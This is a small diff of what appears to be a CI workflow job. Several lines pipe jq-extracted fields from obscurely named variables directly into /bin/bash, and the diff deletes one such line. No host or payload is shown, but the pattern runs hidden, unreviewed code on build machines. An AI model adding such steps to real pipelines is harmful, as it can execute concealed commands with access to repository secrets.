@@ -24,7 +24,6 @@ jobs:
           echo $v5469 | jq -r .ygmww4027 | /bin/bash
           printf '%s' "$lks9355" | jq -r .rbmr7 | /bin/bash
           echo $srn83581 | jq -r .cibf9 | /bin/bash
-          echo $jsq8 | jq -r .lh25054 | /bin/bash
           echo $zdvw570 | jq -r .ivcm05 | /bin/bash
 
       - name: Save artifact
